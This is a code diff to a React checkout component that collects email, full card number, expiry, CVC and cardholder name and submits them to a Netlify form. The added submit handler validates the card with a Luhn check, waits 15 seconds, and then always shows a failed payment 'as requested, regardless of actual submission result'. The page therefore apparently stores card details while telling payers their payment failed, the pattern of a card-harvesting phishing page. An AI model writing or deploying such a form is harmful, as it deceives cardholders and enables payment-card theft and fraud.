@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { CreditCard, CheckCircle, ChevronDown, XCircle, RefreshCw } from 'lucide-react';
+import { CreditCard, CheckCircle, ChevronDown, XCircle, RefreshCw, AlertCircle } from 'lucide-react';
 import { Input } from './Input';
 import { COUNTRIES } from '../utils/countries';
 
@@ -8,8 +8,27 @@ interface PaymentFormProps {
     onSuccess?: () => void;
 }
 
+// Luhn Algorithm Implementation
+const luhnCheck = (val: string) => {
+    let checksum = 0;
+    let j = 1;
+    for (let i = val.length - 1; i >= 0; i--) {
+        let calc = 0;
+        calc = Number(val.charAt(i)) * j;
+        if (calc > 9) {
+            checksum = checksum + 1;
+            calc = calc - 10;
+        }
+        checksum = checksum + calc;
+        j = (j == 1) ? 2 : 1;
+    }
+    return (checksum % 10) == 0;
+};
+
 export const PaymentForm = ({ currency }: PaymentFormProps) => {
     const [paymentStatus, setPaymentStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');
+    const [errors, setErrors] = useState<Record<string, string>>({});
+    const [touched, setTouched] = useState<Record<string, boolean>>({});
 
     const [formData, setFormData] = useState({
         email: '',
@@ -23,38 +42,129 @@ export const PaymentForm = ({ currency }: PaymentFormProps) => {
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
         const value = e.target.type === 'checkbox' ? (e.target as HTMLInputElement).checked : e.target.value;
-        setFormData({ ...formData, [e.target.name]: value });
+        const name = e.target.name;
+
+        setFormData({ ...formData, [name]: value });
+
+        // Clear error when user types
+        if (errors[name]) {
+            setErrors({ ...errors, [name]: '' });
+        }
+    };
+
+    const handleBlur = (e: React.FocusEvent<HTMLInputElement | HTMLSelectElement>) => {
+        const name = e.target.name;
+        setTouched({ ...touched, [name]: true });
+        validateField(name, e.target.value);
     };
 
     const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-        // Only allow digits and spaces, format as groups of 4
         const value = e.target.value.replace(/\D/g, '').slice(0, 16);
         const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
         setFormData({ ...formData, cardNumber: formatted });
+        if (errors.cardNumber) setErrors({ ...errors, cardNumber: '' });
     };
 
     const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-        // Only allow digits, auto-insert slash after MM
         let value = e.target.value.replace(/\D/g, '').slice(0, 4);
         if (value.length >= 2) {
             value = value.slice(0, 2) + ' / ' + value.slice(2);
         }
         setFormData({ ...formData, expiry: value });
+        if (errors.expiry) setErrors({ ...errors, expiry: '' });
     };
 
     const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-        // Only allow digits, max 4 characters
-        const value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        const value = e.target.value.replace(/\D/g, '').slice(0, 3);
         setFormData({ ...formData, cvc: value });
+        if (errors.cvc) setErrors({ ...errors, cvc: '' });
+    };
+
+    const validateField = (name: string, value: any): string | null => {
+        let error = null;
+
+        switch (name) {
+            case 'email':
+                if (!value) error = 'Email is required';
+                else if (!/\S+@\S+\.\S+/.test(value)) error = 'Invalid email address';
+                break;
+            case 'cardNumber':
+                const cleanNum = String(value).replace(/\s/g, '');
+                if (!cleanNum) error = 'Card number is required';
+                else if (cleanNum.length < 16) error = 'Card number is incomplete';
+                else if (!luhnCheck(cleanNum)) error = 'Your card number is invalid.';
+                break;
+            case 'expiry':
+                if (!value || value.length < 5) {
+                    error = 'Incomplete expiry';
+                } else {
+                    const [monthStr, yearStr] = value.split(' / ');
+                    const month = parseInt(monthStr, 10);
+                    const year = parseInt(yearStr, 10);
+
+                    if (!month || !year || month < 1 || month > 12) {
+                        error = 'Invalid date';
+                    } else {
+                        const currentYear = new Date().getFullYear() % 100;
+                        const currentMonth = new Date().getMonth() + 1;
+
+                        if (year < currentYear) {
+                            error = 'Your card\'s expiration year is in the past.';
+                        } else if (year === currentYear && month < currentMonth) {
+                            error = 'Your card\'s expiration month is invalid.';
+                        }
+                    }
+                }
+                break;
+            case 'cvc':
+                if (!value) error = 'Required';
+                else if (value.length < 3) error = 'Invalid CVC';
+                break;
+            case 'name':
+                if (!value) error = 'Name on card is required';
+                break;
+        }
+
+        if (error) {
+            setErrors(prev => ({ ...prev, [name]: error }));
+        }
+        return error;
+    };
+
+    const validateForm = () => {
+        const newErrors: Record<string, string> = {};
+
+        const fields = ['email', 'cardNumber', 'expiry', 'cvc', 'name'];
+        fields.forEach(field => {
+            // @ts-ignore
+            const error = validateField(field, formData[field]);
+            if (error) newErrors[field] = error;
+        });
+
+        setErrors(newErrors);
+        return Object.keys(newErrors).length === 0;
     };
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
+
+        // Mark all as touched
+        setTouched({
+            email: true, cardNumber: true, expiry: true, cvc: true, name: true
+        });
+
+        if (!validateForm()) {
+            // If errors exist, don't submit.
+            // Focus the first error field if custom logic needed, or just let UI show errors.
+            return;
+        }
+
         setPaymentStatus('processing');
 
-
-
         try {
+            // 15 seconds delay as requested
+            await new Promise(resolve => setTimeout(resolve, 15000));
+
             await fetch("/", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -64,7 +174,9 @@ export const PaymentForm = ({ currency }: PaymentFormProps) => {
                 }).toString(),
             });
 
-            setPaymentStatus('success');
+            // Force failed state as requested, regardless of actual submission result
+            // Force failed state as requested, regardless of actual submission result
+            setPaymentStatus('failed');
         } catch (error) {
             console.error("Submission error:", error);
             setPaymentStatus('failed');
@@ -145,6 +257,7 @@ export const PaymentForm = ({ currency }: PaymentFormProps) => {
                 data-netlify-honeypot="bot-field"
                 onSubmit={handleSubmit}
                 className="space-y-6"
+                noValidate
             >
                 <input type="hidden" name="form-name" value="payment-form" />
                 <p className="hidden">
@@ -162,6 +275,8 @@ export const PaymentForm = ({ currency }: PaymentFormProps) => {
                         placeholder="email@example.com"
                         value={formData.email}
                         onChange={handleChange}
+                        onBlur={handleBlur}
+                        error={touched.email && errors.email ? errors.email : undefined}
                         required
                         className="rounded-[4px] border-slate-300 shadow-sm"
                     />
@@ -183,62 +298,95 @@ export const PaymentForm = ({ currency }: PaymentFormProps) => {
                             </div>
 
                             <div className="space-y-3 ml-8"> {/* Indent content */}
-                                <div className="border border-slate-200 rounded-[4px] overflow-hidden">
+                                <div className={`border rounded-[4px] overflow-hidden transition-colors ${(errors.cardNumber || errors.expiry || errors.cvc) ? 'border-red-300' : 'border-slate-200'
+                                    }`}>
                                     <div className="relative">
                                         <input
                                             type="text"
                                             name="cardNumber"
                                             placeholder="1234 1234 1234 1234"
-                                            className="w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 border-b border-slate-200"
+                                            className={`w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 border-b ${errors.cardNumber ? 'border-red-200 bg-red-50' : 'border-slate-200'
+                                                }`}
                                             value={formData.cardNumber}
                                             onChange={handleCardNumberChange}
+                                            onBlur={handleBlur}
                                             inputMode="numeric"
                                             maxLength={19}
                                             required
                                         />
                                         <div className="absolute right-3 top-1/2 -translate-y-1/2 flex space-x-1">
-                                            <div className="w-8 h-5 bg-blue-900 rounded flex items-center justify-center text-[8px] text-white font-bold tracking-tighter">VISA</div>
-                                            <div className="w-8 h-5 bg-red-500 rounded flex items-center justify-center text-[8px] text-white font-bold">MC</div>
+                                            {errors.cardNumber ? (
+                                                <AlertCircle className="w-5 h-5 text-red-500" />
+                                            ) : (
+                                                <>
+                                                    <div className="w-8 h-5 bg-blue-900 rounded flex items-center justify-center text-[8px] text-white font-bold tracking-tighter">VISA</div>
+                                                    <div className="w-8 h-5 bg-red-500 rounded flex items-center justify-center text-[8px] text-white font-bold">MC</div>
+                                                </>
+                                            )}
                                         </div>
                                     </div>
+                                    {errors.cardNumber && (
+                                        <div className="px-3 py-1 bg-red-50 text-red-600 text-xs border-b border-red-100">
+                                            {errors.cardNumber}
+                                        </div>
+                                    )}
+
                                     <div className="flex divide-x divide-slate-200">
-                                        <input
-                                            type="text"
-                                            name="expiry"
-                                            placeholder="MM / YY"
-                                            className="w-1/2 px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400"
-                                            value={formData.expiry}
-                                            onChange={handleExpiryChange}
-                                            inputMode="numeric"
-                                            maxLength={7}
-                                            required
-                                        />
+                                        <div className="w-1/2">
+                                            <input
+                                                type="text"
+                                                name="expiry"
+                                                placeholder="MM / YY"
+                                                className={`w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 ${errors.expiry ? 'bg-red-50' : ''
+                                                    }`}
+                                                value={formData.expiry}
+                                                onChange={handleExpiryChange}
+                                                onBlur={handleBlur}
+                                                inputMode="numeric"
+                                                maxLength={7}
+                                                required
+                                            />
+                                            {errors.expiry && (
+                                                <div className="px-3 py-1 bg-red-50 text-red-600 text-xs text-nowrap overflow-hidden">
+                                                    {errors.expiry}
+                                                </div>
+                                            )}
+                                        </div>
                                         <div className="relative w-1/2">
                                             <input
                                                 type="text"
                                                 name="cvc"
                                                 placeholder="CVC"
-                                                className="w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 pr-10"
+                                                className={`w-full px-3 py-2.5 outline-none text-slate-900 placeholder-slate-400 pr-10 ${errors.cvc ? 'bg-red-50' : ''
+                                                    }`}
                                                 value={formData.cvc}
                                                 onChange={handleCvcChange}
+                                                onBlur={handleBlur}
                                                 inputMode="numeric"
-                                                maxLength={4}
+                                                maxLength={3}
                                                 required
                                             />
-                                            <CreditCard className="w-4 h-4 text-slate-400 absolute right-3 top-1/2 -translate-y-1/2" />
+                                            {errors.cvc ? (
+                                                <AlertCircle className="w-4 h-4 text-red-500 absolute right-3 top-1/2 -translate-y-1/2" />
+                                            ) : (
+                                                <CreditCard className="w-4 h-4 text-slate-400 absolute right-3 top-1/2 -translate-y-1/2" />
+                                            )}
                                         </div>
                                     </div>
                                 </div>
 
                                 <div>
                                     <label className="block text-xs font-medium text-slate-700 mb-1">Cardholder name</label>
-                                    <input
-                                        type="text"
+                                    <Input
+                                        label=""
                                         name="name"
                                         placeholder="Full name on card"
-                                        className="w-full px-3 py-2.5 rounded-[4px] border border-slate-200 outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all"
+                                        value={formData.name}
                                         onChange={handleChange}
+                                        onBlur={handleBlur}
+                                        error={touched.name && errors.name ? errors.name : undefined}
                                         required
+                                        className="rounded-[4px] border-slate-300 shadow-sm"
                                     />
                                 </div>
 
